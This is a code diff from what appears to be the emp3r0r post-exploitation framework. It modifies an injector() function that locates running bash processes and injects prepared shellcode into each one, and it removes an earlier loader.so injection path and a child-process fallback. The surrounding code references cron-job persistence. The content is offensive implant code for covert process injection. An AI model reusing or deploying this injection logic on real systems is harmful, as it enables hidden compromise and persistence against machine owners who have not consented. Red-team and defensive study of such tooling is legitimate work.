@@ -13,7 +13,6 @@ import (
 	"os/user"
 	"strings"
 
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -195,7 +194,7 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
-// Inject loader.so into running processes, loader.so launches emp3r0r
+// Inject guardian shellcode into running processes
 func injector() (err error) {
 	// find some processes to inject
 	procs := util.PidOf("bash")
@@ -210,18 +209,16 @@ func injector() (err error) {
 			if pid == 0 {
 				return
 			}
-			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)
-
-			e := InjectLoader(pid)
-			if e != nil {
-				err = fmt.Errorf("%v, %v", err, e)
+			title := fmt.Sprintf("%s (%d)", util.ProcCmdline(pid), pid)
+			// prepare shellcode
+			shellcode, _ := prepare_sc(pid)
+			inject_err := ShellcodeInjector(&shellcode, pid)
+			if inject_err != nil {
+				err = fmt.Errorf("%v; %s: %v", err, title, inject_err)
+				return
 			}
 		}(pid)
 	}
-	if err != nil {
-		return fmt.Errorf("All attempts failed (%v), trying with new child process: %v", err, ShellcodeInjector(&emp3r0r_data.GuardianShellcode, 0))
-	}
-
 	return
 }
 
